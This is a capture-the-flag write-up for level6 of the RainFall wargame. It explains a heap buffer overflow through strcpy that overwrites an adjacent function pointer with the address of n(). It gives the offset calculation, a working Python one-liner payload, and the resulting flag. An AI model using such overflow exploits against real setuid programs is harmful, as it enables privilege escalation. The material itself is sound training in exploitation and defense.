<p align="justify">

level6 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
```

level6 rights:
```Shell
-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6
```

Here is what we get when testing:
```Shell
level6@RainFall:~$ ./level6
Segmentation fault (core dumped)
level6@RainFall:~$ ./level6 weouhalierhgaieurgh
Nope
```

Decompiling with Ghidra on https://dogbolt.org/ shows five things:
- the program takes a string as argument and has two malloc'ed variables
- `__dest` is a string of 64-bytes
- `ppcVar1` is a variable of 4-bytes that currently stores the address of the `m()` function (that does nothing)
- `strcpy()` uses the user input argument to store it into `__dest`, right before calling `ppcVar1`
- there is an unused `n()` that `cat` the next password

The goal is therefore to find a way to replace the content of `ppcVar1` with the `n()` function. To do so, we can do a buffer overflow and abuse `strcpy()`, because it doesn't check that the size of input matches the size of dest. We can pad it with the right amount of chars and simply add the address of `n()`. This will work because `ppcVar1` and `__dest` sit next to each other, as we are on the heap. Overflowing `__dest` will allow us to overwrite whatever is in `ppcVar1` with whatever we want.

To get the right size for the payload, we must calculate how many bytes separate `__dest` from the start of `ppcVar1`.
First, we found the addresses of each malloc using `ltrace`:
```Shell
level6@RainFall:~$ ltrace ./level6
[...]
malloc(64) = 0x0804a008
malloc(4) = 0x0804a050
[...]
```
We can now calculate the offset for our payload by doing the following subtraction: 0x0804a050 - 0x0804a008 = 72

Next, we can find the address of `n()`:
```Shell
(gdb) x n
0x8048454 <n>:  0x83e58955
```

So the result is:
```Shell
level6@RainFall:~$ ./level6 $(python -c 'print("A" * 72 + "\x54\x84\x04\x08")')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

</p>